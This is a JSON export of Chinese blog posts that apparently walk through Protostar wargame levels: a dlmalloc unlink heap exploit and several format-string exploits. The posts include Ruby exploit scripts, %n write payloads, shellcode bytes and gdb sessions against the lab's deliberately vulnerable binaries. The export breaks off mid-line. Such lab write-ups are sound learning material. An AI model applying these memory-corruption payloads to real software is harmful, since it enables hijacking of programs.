[{"content":"References 其实到目前为止我并没有全部理解\n但是因为思路很乱有点理不清了，所以姑且把已经理解的部分记下来\nOnce upon a free()\u0026hellip;\nProtostar Heap3 Walkthrough | conceptofproof\nThe Heap: dlmalloc unlink() exploit - bin 0x18\n Dlmalloc Basics 使用中的 chunk：\n prev_size: 4 bytes 用于标注前一个 chunk 的大小 size: 4 bytes 用于标注当前 chunk 的大小，且最后三比特用于标记：  倒数第一位用于标记前一个 chunk 是否被使用 倒数第二位用于标记当前 chunk 是否已通过 mmap 分配     NAME\nmmap, munmap - map or unmap files or devices into memory\nSYNOPSIS\n#include \u0026lt;sys/mman.h\u0026gt; void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset); int munmap(void *addr, size_t length);\nSee NOTES for information on feature test macro requirements.\nDESCRIPTION\nmmap() creates a new mapping in the virtual address space of the calling process. The starting address for the new mapping is specified in addr. The length argument specifies the length of the mapping (which must be greater than 0).\n  chunk -\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | prev_size: size of the previous chunk, in bytes (used | | by dlmalloc only if this previous chunk is free) | +---------------------------------------------------------+ | size: size of the chunk (the number of bytes between | | \u0026#34;chunk\u0026#34; and \u0026#34;nextchunk\u0026#34;) and 2 bits status information | mem -\u0026gt; +---------------------------------------------------------+ | fd: not used by dlmalloc because \u0026#34;chunk\u0026#34; is allocated | | (user data therefore starts here) | + - - - - - - - - - - - - - - - - - - - - - - - - - - - - + | bk: not used by dlmalloc because \u0026#34;chunk\u0026#34; is allocated | | (there may be user data here) | + - - - - - - - - - - - - - - - - - - - - - - - - - - - - + | . . . . user data (may be 0 bytes long) . . . . | nextchunk -\u0026gt; + + + + + + + + + + + + + + + + + + + + + + + + + + + + + + | prev_size: not used by dlmalloc because \u0026#34;chunk\u0026#34; is | | allocated (may hold user data, to decrease wastage) | +---------------------------------------------------------+ 已 free 的 chunk：\n fd: 4 bytes 指向双向链表的前一个 chunk bk: 4 bytes 指向双向链表的后一个 chunk   chunk -\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | prev_size: may hold user data (indeed, since \u0026#34;chunk\u0026#34; is | | free, the previous chunk is necessarily allocated) | +---------------------------------------------------------+ | size: size of the chunk (the number of bytes between | | \u0026#34;chunk\u0026#34; and \u0026#34;nextchunk\u0026#34;) and 2 bits status information | mem -\u0026gt; +---------------------------------------------------------+ | fd: forward pointer to the next chunk in the circular | | doubly-linked list (not to the next _physical_ chunk) | +---------------------------------------------------------+ | bk: back pointer to the previous chunk in the circular | | doubly-linked list (not the previous _physical_ chunk) | +---------------------------------------------------------+ | . . . . unused space (may be 0 bytes long) . . . . | nextchunk -\u0026gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+ | prev_size: size of \u0026#34;chunk\u0026#34;, in bytes (used by dlmalloc | | because this previous chunk is free) | +---------------------------------------------------------+ 重点\n如果一个 chunk 即将被 free，那么：\n 如果这个 chunk 是通过 mmap 分配的，那么调用 munmap_chunk() 如果这个 chunk 不是通过 mmap 分配的，那么调用 chunk_free()  INTERNAL_SIZE_T hd = p-\u0026gt;size; ... if (!hd \u0026amp; PREV_INUSE)) /* consolidate backward */ /* [A] */ { prevsz = p-\u0026gt;prev_size; p = chunk_at_offset(p, -(long)prevsz); /* [B] */ sz += prevsz; if (p-\u0026gt;fd == last_remainder(ar_ptr)) islr = 1; else unlink(p, bck, fwd); } 在 chunk_free() 函数中，有另一个需要注意的函数：\n 如果前一个 chunk 也被 free 了的话，那么会调用 unlink()， 以确保双向链表的准确链接：  #define unlink( P, BK, FD ) {  BK = P-\u0026gt;bk;\t\\ FD = P-\u0026gt;fd;\t\\ FD-\u0026gt;bk = BK;\t\\ BK-\u0026gt;fd = FD;\t\\ } 以及，如果 chunk 小于 64 bytes，那么 malloc 会使用另一个简化版的数据结构，被称为 fastbin，而不是上述的双向链表\n Heap Three  This level introduces the Doug Lea Malloc (dlmalloc) and how heap meta data can be modified to change program execution.\nThis level is at /opt/protostar/bin/heap3\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;string.h\u0026gt;#include \u0026lt;sys/types.h\u0026gt;#include \u0026lt;stdio.h\u0026gt; void winner() { printf(\u0026#34;that wasn\u0026#39;t too bad now, was it? @ %d\\n\u0026#34;, time(NULL)); } int main(int argc, char **argv) { char *a, *b, *c; a = malloc(32); b = malloc(32); c = malloc(32); strcpy(a, argv[1]); strcpy(b, argv[2]); strcpy(c, argv[3]); free(c); free(b); free(a); printf(\u0026#34;dynamite failed?\\n\u0026#34;); }  我们的目标是把 puts() 在 Global Offset Table 中记录的地址上，写上能跳转到 winner() 的 shellcode\n可使用这个工具\npush 0x08048864 ret Assembly - Little Endian: \u0026#34;\\x68\\x64\\x88\\x04\\x08\\xc3\u0026#34; 而能帮我们达到以上目的的函数就是 free()， 准确来说是 unlink()，思路如下：\n首先 strcpy() 不会检查字符数量，所以可以在堆上写多于 buffer 大小的字符\n还记得前面提到的 unlink() 么，它可以往 P-\u0026gt;fd 和 P-\u0026gt;bk 上写值\n这样的话我们可以通过指向 chunk A 的 第一个 strcpy() 在堆上写出一个 fake chunk，\n并欺骗 free() 函数（和里面的 unlink() ），让它以为 fake chunk 在即将被 free() 的 chunk 之前，以此欺骗 unlink() 往我们所想要的地址写值\n而这个「即将被 free 的 chunk」我们就用 chunk B 吧，\n那么 chunk B应具有以下特点：\n  size 大小大于 64 bytes 不然会使用 fastbin 而不是双向链表 实现思路是让 size 大于 64（废话\n  前一个 chunk 看起来已被 free 不然就不会 unlink() 函数连接来两个双向链表 实现思路是让 size 的最后一个比特为零\n  以上两点是 unlink() 会被调用的先决条件 具体实现，是\n 在 size 写一个负值 0xfffffffc，即 -4  这个值在同时满足以上条件的同时，还有另一个特点，就是在计算下一个 chunk 时，使用的是 chunk B + size 即 P + (-4)，那么就是在 chunk B 开头向前 4 bytes 的位置（实际上这里是 chunk A 的范围）\n在 prev_size 上写上 0xfffffff8，即 -8，  计算上一个 chunk 时 chunk B - prev_size 即 chunk B - (-8)，那么就是在 chunk B 开头向后 8 bytes 的位置，也就是 mem ，而这里就是我们可以通过指向 chunk B 的 mem 的第二个 strcpy() 来写我们的 fake chunk 的位置\n   Untitled Diagram      ","date":"2022-04-06T00:00:00Z","image":"/cover.png","permalink":"/p/protostar_heap_3/","title":"Protostar Format 3 Walkthrough"},{"content":"☞ 最终的 Ruby 脚本放在了这里\n Format One ☞ Protostar Format One\n This level shows how format strings can be used to modify arbitrary memory locations.\nHints\n objdump -t is your friend, and your input string lies far up the stack :)  This level is at /opt/protostar/bin/format1\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int target; void vuln(char *string) { printf(string); if(target) { printf(\u0026#34;you have modified the target :)\\n\u0026#34;); } } int main(int argc, char **argv) { vuln(argv[1]); }  Argv[1], %p, Breadcrumb 乍一看，感觉好简单x\nint main(int argc, char **argv) 这里用了指针\n那么思路就是打印一个面包屑做标记比如 ABCD 和一堆 %p 直到输出里出现 44434241 时，说明这里开始就是我们输入的 argv[1] 了\n为什么要叫「面包屑」？参考《糖果屋》\n 另外，查看 man 3 printf 的话可以看到：\n%p: The void * pointer argument is printed in hexadecimal (as if by %#x or %#lx).\n所以 %p 和 %08x 效果几乎是一样的，只是 %08x 会在位数不足时开头补上 0，但不会像 %p 那样在每个数字开头补上 \u0026ldquo;0x\u0026rdquo;\n比如，在 %08x 里看起来是这样的值：00000021\n在 %p 里看起来会是这样：0x21\n另外，在 %08x 里看起来是这样的值：00000000\n在 %p 里看起来会是这样：(nil)，也就是 NULL 的意思\n  那么开始尝试吧\u0026hellip;使用 ruby -e\nuser@protostar:/tmp$ /opt/protostar/bin/format1 `ruby -e \u0026#39;puts \u0026#34;ABCD\u0026#34; + \u0026#34;|%p\u0026#34;*131 \u0026#39;` ABCD|0x804960c|0xbffff628|0x8048469|0xb7fd8304|0xb7fd7ff4|0xbffff628|0x8048435|0xbffff7fc|0xb7ff1040|0x804845b|0xb7fd7ff4|0x8048450|(nil)|0xbffff6a8|0xb7eadc76|0x2|0xbffff6d4|0xbffff6e0|0xb7fe1848|0xbffff690|0xffffffff|0xb7ffeff4|0x804824d|0x1|0xbffff690|0xb7ff0626|0xb7fffab0|0xb7fe1b28|0xb7fd7ff4|(nil)|(nil)|0xbffff6a8|0xdda5d91d|0xf7f1cf0d|(nil)|(nil)|(nil)|0x2|0x8048340|(nil)|0xb7ff6210|0xb7eadb9b|0xb7ffeff4|0x2|0x8048340|(nil)|0x8048361|0x804841c|0x2|0xbffff6d4|0x8048450|0x8048440|0xb7ff1040|0xbffff6cc|0xb7fff8f8|0x2|0xbffff7e1|0xbffff7fc|(nil)|0xbffff98a|0xbffff998|0xbffff9ac|0xbffff9ce|0xbffff9e1|0xbffff9eb|0xbffffedb|0xbfffff19|0xbfffff2d|0xbfffff36|0xbfffff47|0xbfffff4f|0xbfffff5f|0xbfffff6c|0xbfffffa2|0xbfffffb1|0xbfffffc4|(nil)|0x20|0xb7fe2414|0x21|0xb7fe2000|0x10|0xf8bfbff|0x6|0x1000|0x11|0x64|0x3|0x8048034|0x4|0x20|0x5|0x7|0x7|0xb7fe3000|0x8|(nil)|0x9|0x8048340|0xb|0x3e9|0xc|(nil)|0xd|0x3e9|0xe|0x3e9|0x17|0x1|0x19|0xbffff7cb|0x1f|0xbfffffe1|0xf|0xbffff7db|(nil)|(nil)|0xdc000000|0xdcc44ff8|0x5d311124|0xf251c72e|0x6923116e|0x363836|0x706f2f00|0x72702f74|0x736f746f|0x2f726174|0x2f6e6962|0x6d726f66|0x317461|0x44434241user@protostar:/tmp$ 好耶，看起来第 131 个 %p 就是 argv[1] 开始的地方了！\n接下来看看 %n 的定义：\n The number of characters written so far is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.\n也就是说，可以用来一个地址写入「当前已打印了多少字符」\n 只要把 ABCD 换成自己想写的地址，第 131 个 %p 替换成 %n 就能改变这个地址的值了是么！\n Script #1 于是我写出了如下的脚本：\n#!/usr/bin/ruby breadcrumb = \u0026#34;ABCD\u0026#34; # convert ASCII to Hex in Little Endian # str: String # return: String def to_hex(str) return str.unpack(\u0026#39;N*\u0026#39;).pack(\u0026#39;V*\u0026#39;).unpack(\u0026#39;H*\u0026#39;) * \u0026#34;\u0026#34; end index = 1 maximum = 200 while index \u0026lt; maximum command = \u0026#34;/opt/protostar/bin/format1 \u0026#34; + breadcrumb + \u0026#34;%p\u0026#34; * (index + 1) result = `#{command}` puts result if result.include? to_hex(breadcrumb) then break end index += 1 end puts \u0026#34;index: #{index}\u0026#34; # address of target: 0x08049638 target = \u0026#34;\\x38\\x96\\x04\\x08\u0026#34; command = \u0026#34;/opt/protostar/bin/format1 \u0026#34; + target + (\u0026#34;%p\u0026#34; * index) + \u0026#34;%n\u0026#34; puts \u0026#34;Running: #{command}\u0026#34; puts `#{command}` 这个脚本的思路很简单：\n 每次都多打印一个 %p 如果在返回里检测到了 breadcrumb 的小端序值（这里面包屑是 ABCD，对应的值是 44434241）那么就停下来 记住到底打印了多少个 %p 才到了栈上 argv[1] 的位置 把面包屑 breadcrumb 替换成要写的地址，打印同样多的 %p 但把最后一个 %p 替换成 %n 结束   Unpack, Pack, MAGIC 有一个很奇怪的东西姑且也作为笔记记下来吧\n也就是这个脚本里的 def to_hex(str)\n它只做了一件事，就是 return str.unpack('N*').pack('V*').unpack('H*') * \u0026quot;\u0026quot;\n然后就可以把一串 ASCII 变成小端序的十六进制\n这 是 魔 法\n开一个 irb 来看看到底发生了什么吧\nirb(main):009:0\u0026gt; tmp = \u0026#34;ABCD\u0026#34; =\u0026gt; \u0026#34;ABCD\u0026#34; irb(main):010:0\u0026gt; tmp = tmp.unpack(\u0026#39;N*\u0026#39;) =\u0026gt; [1094861636] irb(main):011:0\u0026gt; tmp = tmp.pack(\u0026#39;V*\u0026#39;) =\u0026gt; \u0026#34;DCBA\u0026#34; irb(main):012:0\u0026gt; tmp = tmp.unpack(\u0026#39;H*\u0026#39;) =\u0026gt; [\u0026#34;44434241\u0026#34;] irb(main):013:0\u0026gt; tmp = tmp * \u0026#34;\u0026#34; =\u0026gt; \u0026#34;44434241\u0026#34; irb(main):014:0\u0026gt; tmp.class =\u0026gt; String 可见分为了以下步骤\n  tmp.unpack('N*')\n把 String 类型的 tmp 转换成 32 bit 的整型，小端序。注意，从这里开始 tmp 的类型是 Array 了\n  tmp.pack('V*')\n把 tmp 编码成字符串，大端序\n  tmp = tmp.unpack('H*')\n把 tmp 编码成十六进制\n  tmp = tmp * \u0026quot;\u0026quot;\n把 Array 类型的 tmp 转换成 String 类型\n   Breadcrumb is not in the last %p 可是执行这个脚本的时候却出现了这样的结果：\n...664106e50xf1fcc6110xabeb1fff0x6916e02d0x363836(nil)0x706f2f000x72702f740x736f746f0x2f7261740x2f6e69620x6d726f660x3174610x444342410x70257025 index: 132 Running: /opt/..... 打印了 132 个 %p ，然后确实出现了 0x444342410，但是却..不在最后一个 %p 上..而是在第 131 个\n那为什么不在打印了 131 个 %p 后就停下来呢\u0026hellip;\n幸好每次增加一个 %p 的结果都有输出，让我们往上翻看一下 131 个 %p 时是什么情况\u0026hellip;\n......0x69622f720x6f662f6e0x74616d720x42410031 为什么打印 131 个 %p 时出现了 0x42410031\u0026hellip;\n44 和 43 去哪里了呢\u0026hellip;\n我们回到开头那句命令\n/opt/protostar/bin/format1 `ruby -e \u0026#39;puts \u0026#34;ABCD\u0026#34; + \u0026#34;|%p\u0026#34;*133 \u0026#39;`` 重新测试一下：\n# pwd: / # %p * 133 |0x616d726f|0x41003174|0x7c444342user@protostar:/$ # %p * 134 |0x317461|0x44434241|0x7c70257c|0x257c7025user@protostar:/$ # %p * 135 |0x726f662f|0x3174616d|0x43424100|0x70257c44|0x7c70257c|0x257c7025|0x70257c70user@protostar:/$ 会发现面包屑对应的十六进制无法出现在一个 4 bytes 上，\n且就算出现在了一个 4 bytes 里也并不出现在最后一个%p\n这也就导致了那个脚本无法使用\n到底怎么会是呢\u0026hellip;\n Pwd, Alignment, Environment Variables 不知道读者有没有注意到一点，\n在最开始那个 44434241 完美出现在一个 4 bytes 里，还是在最后一个 %p 的情况，\n它的工作目录是：/tmp\n而上面那个无法对齐又不在最后一个的情况，工作目录是：/\n看来大概的确是环境变量的问题，让我们开个 gdb 验证一下\n检视一下栈的位置：\n(gdb) info proc map process 7506 cmdline = \u0026#39;/opt/protostar/bin/format1\u0026#39; cwd = \u0026#39;/\u0026#39; exe = \u0026#39;/opt/protostar/bin/format1\u0026#39; Mapped address spaces: Start Addr End Addr Size Offset objfile 0x8048000 0x8049000 0x1000 0 /opt/protostar/bin/format1 0x8049000 0x804a000 0x1000 0 /opt/protostar/bin/format1 0xb7e96000 0xb7e97000 0x1000 0 0xb7e97000 0xb7fd5000 0x13e000 0 /lib/libc-2.11.2.so 0xb7fd5000 0xb7fd6000 0x1000 0x13e000 /lib/libc-2.11.2.so 0xb7fd6000 0xb7fd8000 0x2000 0x13e000 /lib/libc-2.11.2.so 0xb7fd8000 0xb7fd9000 0x1000 0x140000 /lib/libc-2.11.2.so 0xb7fd9000 0xb7fdc000 0x3000 0 0xb7fe0000 0xb7fe2000 0x2000 0 0xb7fe2000 0xb7fe3000 0x1000 0 [vdso] 0xb7fe3000 0xb7ffe000 0x1b000 0 /lib/ld-2.11.2.so 0xb7ffe000 0xb7fff000 0x1000 0x1a000 /lib/ld-2.11.2.so 0xb7fff000 0xb8000000 0x1000 0x1b000 /lib/ld-2.11.2.so 0xbffeb000 0xc0000000 0x15000 0 [stack] 可以看到是从 0xbffeb000 到 0xc0000000\n接下来找找 argv[1] 的地址：\n(gdb) disassemble main Dump of assembler code for function main: 0x0804841c \u0026lt;main+0\u0026gt;:\tpush ebp 0x0804841d \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x0804841f \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x08048422 \u0026lt;main+6\u0026gt;:\tsub esp,0x10 0x08048425 \u0026lt;main+9\u0026gt;:\tmov eax,DWORD PTR [ebp+0xc] 0x08048428 \u0026lt;main+12\u0026gt;:\tadd eax,0x4 0x0804842b \u0026lt;main+15\u0026gt;:\tmov eax,DWORD PTR [eax] 0x0804842d \u0026lt;main+17\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048430 \u0026lt;main+20\u0026gt;:\tcall 0x80483f4 \u0026lt;vuln\u0026gt; 0x08048435 \u0026lt;main+25\u0026gt;:\tleave 0x08048436 \u0026lt;main+26\u0026gt;:\tret End of assembler dump. 在 call 0x80483f4 \u0026lt;vuln\u0026gt; 设置断点并查看 EAX 指向的值就是 argv[1]\n(gdb) break *0x08048430 Note: breakpoint 2 also set at pc 0x8048430. Breakpoint 3 at 0x8048430: file format1/format1.c, line 19. (gdb) r ABCD1234 Starting program: /opt/protostar/bin/format1 ABCD1234 Breakpoint 2, 0x08048430 in main (argc=2, argv=0xbffff844) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff987\t-1073743481 ecx 0x4fa715d9\t1336350169 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff780\t0xbffff780 ebp 0xbffff798\t0xbffff798 esi 0x0\t0 edi 0x0\t0 eip 0x8048430\t0x8048430 \u0026lt;main+20\u0026gt; eflags 0x200286\t[ PF SF IF ID ] cs 0x73\t115 ss 0x7b\t123 ds 0x7b\t123 es 0x7b\t123 fs 0x0\t0 gs 0x33\t51 可以看到 EAX 的地址是 0xbffff987\n为了方便演示，我这里把 EAX 的地址 0xbffff987 前面的一部分内容也打印出来，就从 0xbffff970 开始吧\n使用 x/20s 即：[Examine] / [next 20 values] [String]\n(gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;/protostar/bin/format1\u0026#34; 0xbffff987:\t\u0026#34;ABCD1234\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; 0xbffff99a:\t\u0026#34;SSH_CLIENT=192.168.2..... 可以看到，argv[1] = ABCD1234 时，地址是 0xbffff987\nargv[1] 后面出现的那些是环境变量，我们暂时不用去管\n接下来试着给 argv[1] 增加字符\u0026hellip;.\n(gdb) r ABCD12345 (gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;protostar/bin/format1\u0026#34; 0xbffff986:\t\u0026#34;ABCD12345\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; (gdb) r ABCD123456 (gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;rotostar/bin/format1\u0026#34; 0xbffff985:\t\u0026#34;ABCD123456\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; (gdb) r ABCD1234567 (gdb) x/20s 0xbffff970 0xbffff970:\t\u0026#34;otostar/bin/format1\u0026#34; 0xbffff984:\t\u0026#34;ABCD1234567\u0026#34; 0xbffff990:\t\u0026#34;USER=user\u0026#34; 0xbffff99a:\t\u0026#34;SSH_CL... 可以看到随着参数的逐渐加长，argv[1] 的地址逐渐在减小\u0026hellip;\n但是这又怎么会影响 printf 读到的内容呢..\n因为就算argv[1] 的地址逐渐减小，那 printf 的地址也会逐渐减小的啊，一次减小一个 bytes 的话，printf 的地址到 argv[1] 的地址中间的距离应该不变才对\u0026hellip;\nEAX, EBP, Buffer 上面的设想是错的，实际上 printf 的地址到 argv[1] 的地址中间的距离确实地改变了\n依然用 gdb 做个实验吧，在 call 0x80483f4 \u0026lt;vuln\u0026gt; 设置断点\n(gdb) disassemble main Dump of assembler code for function main: 0x0804841c \u0026lt;main+0\u0026gt;:\tpush ebp 0x0804841d \u0026lt;main+1\u0026gt;:\tmov ebp,esp 0x0804841f \u0026lt;main+3\u0026gt;:\tand esp,0xfffffff0 0x08048422 \u0026lt;main+6\u0026gt;:\tsub esp,0x10 0x08048425 \u0026lt;main+9\u0026gt;:\tmov eax,DWORD PTR [ebp+0xc] 0x08048428 \u0026lt;main+12\u0026gt;:\tadd eax,0x4 0x0804842b \u0026lt;main+15\u0026gt;:\tmov eax,DWORD PTR [eax] 0x0804842d \u0026lt;main+17\u0026gt;:\tmov DWORD PTR [esp],eax 0x08048430 \u0026lt;main+20\u0026gt;:\tcall 0x80483f4 \u0026lt;vuln\u0026gt; 0x08048435 \u0026lt;main+25\u0026gt;:\tleave 0x08048436 \u0026lt;main+26\u0026gt;:\tret End of assembler dump. (gdb) break *0x08048430 Breakpoint 1 at 0x8048430: file format1/format1.c, line 19. 然后改变参数的长度\u0026hellip;\n(gdb) r ABCD1234AB Starting program: /opt/protostar/bin/format1 ABCD1234AB Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff844) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff97c\t-1073743492 ecx 0xad015181\t-1392422527 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff780\t0xbffff780 ebp 0xbffff798\t0xbffff798 esi 0x0\t0 (gdb) r ABCD1234ABC The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /opt/protostar/bin/format1 ABCD1234ABC Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff844) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff97b\t-1073743493 ecx 0x912d21cc\t-1859313204 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff780\t0xbffff780 ebp 0xbffff798\t0xbffff798 esi 0x0\t0 (gdb) r ABCD1234ABCD Starting program: /opt/protostar/bin/format1 ABCD1234ABCD Breakpoint 1, 0x08048430 in main (argc=2, argv=0xbffff834) at format1/format1.c:19 19\tin format1/format1.c (gdb) info registers eax 0xbffff97a\t-1073743494 ecx 0xadac7a9d\t-1381205347 edx 0x2\t2 ebx 0xb7fd7ff4\t-1208123404 esp 0xbffff770\t0xbffff770 ebp 0xbffff788\t0xbffff788 esi 0x0\t0 可以看到，从 ABCD1234AB 到 ABCD1234ABC 时，EAX 确实减小了一，但 EBP 的值没变\n从 ABCD1234ABC 到 ABCD1234ABCD 时，EAX 确实减小了一，\n但 EBP\u0026hellip;从 0xbffff798 到 0xbffff788，减小了 16\u0026hellip;\n那 EBP 是什么呢？\n我们可以看到在 main() 的汇编代码的第一行出现了 0x0804841c \u0026lt;main+0\u0026gt;:\tpush ebp\n而这里的 EBP 就是 main 函数在栈中开始读写数据的位置\n☞ 建议看看这些\n推测有那么一个 16 bytes 的 buffer，每当 buffer 塞满时，主程序所占的栈空间就整体下移 16 bytes，具体体现在 EBP 减小了 16\n至于原因\u0026hellip;？类似硬盘的 4K 对齐？\n总之这就是为什么我们用 %p 来打印 4 bytes 时 44434241 无法出现在同一个 %p 内的原因，毕竟每次参数长度的改变都会改变argv[1] 的地址\n虽然原理是知道了，但总感觉好像无解x\n Script #2 于是稍微修改了一下先前的脚本，现在的脚本思路是：\n 每次都多打印一个 %p 如果在返回里检测到了 breadcrumb 的小端序值（这里面包屑是 ABCD，对应的值是 44434241）那么就停下来 记录输出中第几个 %p 的位置对应着面包屑十六进制值 记录到底打印了多少个 %p 才到了栈上 argv[1] 的位置 把面包屑 breadcrumb 替换成要写的地址，打印同样多的 %p 但把第三步中记录的 %p 换成 %n 结束  #!/usr/bin/ruby # convert ASCII to Hex in Little Endian # str: String # return: String def to_hex(str) # convert to 32 bit integers in small endian # the tmp is Array tmp = str.unpack(\u0026#39;N*\u0026#39;) # encode these integers with big endian tmp = tmp.pack(\u0026#39;V*\u0026#39;) # encode the result in hexadecimal tmp = tmp.unpack(\u0026#39;H*\u0026#39;) # convert Array to String return tmp * \u0026#34;\u0026#34; end # address of target: 0x08049638 target = \u0026#34;\\x38\\x96\\x04\\x08\u0026#34; breadcrumb = \u0026#34;ABCD\u0026#34; times = 1 maximum = 200 while times \u0026lt;= maximum command = \u0026lt;\u0026lt;-END /opt/protostar/bin/format1 \u0026#34;#{breadcrumb}#{\u0026#34;%p \u0026#34; * times}\u0026#34; END result = `#{command}` if result.include? to_hex(breadcrumb) then break end if times == maximum then abort(\u0026#34;err\u0026#34;) end times += 1 end puts result puts \u0026#34;\u0026gt; %p appeared #{times}times\u0026#34; breadcrumb_index = result.split.index(\u0026#34;0x\u0026#34; + to_hex(breadcrumb)) puts \u0026#34;\u0026gt; breadcrumb appeared in the #{breadcrumb_index}%p\u0026#34; command = \u0026lt;\u0026lt;-END /opt/protostar/bin/format1 \u0026#34;#{target}#{\u0026#34;%p \u0026#34; * (breadcrumb_index - 1)}%n #{\u0026#34;%p \u0026#34; * (times - breadcrumb_index)}\u0026#34; END puts \u0026#34;\u0026gt; exec: #{command}\u0026#34; puts `#{command}` 完成w\n","date":"2022-03-31T00:00:00Z","image":"/p/protostar_format_1/cover_hu496a20f2b4777c05e734bfc6b70c220b_1249701_120x120_fill_box_smart1_3.png","permalink":"/p/protostar_format_1/","title":"格式，参数，红宝石"},{"content":"所有的 ruby 脚本已经放在了这里\n Protostar ☞ Protostar\nProtostar introduces the following in a friendly way:\n Network programming Byte order Handling sockets Stack overflows Format strings Heap overflows The above is introduced in a simple way, starting with simple memory corruption and modification, function redirection, and finally executing custom shellcode.  In order to make this as easy as possible to introduce Address Space Layout Randomisation and Non-Executable memory has been disabled. If you are interested in covering ASLR and NX memory, please see the Fusion page.\n Format Zero  This level introduces format strings, and how attacker supplied format strings can modify the execution flow of programs.\nHints\n This level should be done in less than 10 bytes of input. “Exploiting format string vulnerabilities”  This level is at /opt/protostar/bin/format0\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; void vuln(char *string) { volatile int target; char buffer[64]; target = 0; sprintf(buffer, string); if(target == 0xdeadbeef) { printf(\u0026#34;you have hit the target correctly :)\\n\u0026#34;); } } int main(int argc, char **argv) { vuln(argv[1]); }  总感觉这其实算 Stack 的题x\n没有太多能说的..\n#!/usr/bin/ruby padding = \u0026#34;%64d\u0026#34;; deadbeef = \u0026#34;\\xef\\xbe\\xad\\xde\u0026#34;; command = \u0026lt;\u0026lt;-END /opt/protostar/bin/format0 #{padding + deadbeef} END puts `#{command}` 唯一需要说明的就是 %64d 的作用是对 char buffer[64] 填充 64 个空格进行占位\n Format One 由于比较奇怪所以放在了这里\n Format Two  This level moves on from format1 and shows how specific values can be written in memory.\nThis level is at /opt/protostar/bin/format2\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int target; void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printf(buffer); if(target == 64) { printf(\u0026#34;you have modified the target :)\\n\u0026#34;); } else { printf(\u0026#34;target is %d :(\\n\u0026#34;, target); } } int main(int argc, char **argv) { vuln(); }  首先依然是用 objdump 来找到 target 的地址，是 0x080496e4\n接下来需要知道我们输入的数据被存在了栈的哪里\nuser@protostar:/tmp/format$ /opt/protostar/bin/format2 ABCD%08x|%08x|%08x|%08x|%08x|%08x ABCD00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c target is 0 :( 可以看到 ABCD 的 ASCII 也就是 44434241 出现在了第 4 个 %08x\ntarget = \u0026#34;\\xe4\\x96\\x04\\x08\u0026#34; stdin = target + \u0026#34;%60x%4$n\u0026#34; # echo 使用单引号，避免把 %4$n 解析成变量 command = \u0026#34;echo \u0026#39;#{stdin}\u0026#39; | /opt/protostar/bin/format2\u0026#34; puts `#{command}` target 也就是 \\xe4\\x96\\x04\\x08 是 4 bytes 再加上 60 个 bytes 的话也就是 64 了\n所以使用 %60x%4$n\n %60x 打印 60 个 bytes %4$n 选取第 4 个参数（也就是上面说 ABCD 出现在第 4 个 %08x）写入「当前打印了多少字符」   Format Three  This level advances from format2 and shows how to write more than 1 or 2 bytes of memory to the process. This also teaches you to carefully control what data is being written to the process memory.\nThis level is at /opt/protostar/bin/format3\n #include \u0026lt;stdlib.h\u0026gt;#include \u0026lt;unistd.h\u0026gt;#include \u0026lt;stdio.h\u0026gt;#include \u0026lt;string.h\u0026gt; int target; void printbuffer(char *string) { printf(string); } void vuln() { char buffer[512]; fgets(buffer, sizeof(buffer), stdin); printbuffer(buffer); if(target == 0x01025544) { printf(\u0026#34;you have modified the target :)\\n\u0026#34;); } else { printf(\u0026#34;target is %08x :(\\n\u0026#34;, target); } } int main(int argc, char **argv) { vuln(); }  objdump 找到 target 的地址是 0x080496f4\n我们的目标是让这个地址上的值为 0x01025544\nuser@protostar:/tmp/format$ /opt/protostar/bin/format3 ABCD%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x|%08x ABCD00000000|bffff590|b7fd7ff4|00000000|00000000|bffff798|0804849d|bffff590|00000200|b7fd8420|bffff5d4|44434241|78383025|3830257c|30257c78|257c7838 target is 00000000 :( 可见 ABCD 出现在第 12 个 %08x，可以稍后替换成我们所需要的地址\n所以可以使用 %12$n 来选取第 12 个参数\n0x01025544 这个值其实可以分成三步来写：\n 在 0x080496f4 写入 0x44 也就是十进制 68 在 0x080496f5 写入 0x55 也就是十进制 85 在 0x080496f6 写入 0x0102 也就是十进制 258  为什么是写 0x0102 而不是分成两个来写呢？\n因为我们只能用 %n 来写入，而 %n 写入的值是「当前打印了多少字符」\n所以下一个值永远只能大于上一个值\n如果直接写0x02 的话就小于 0x55，是无法做到的\ntarget = 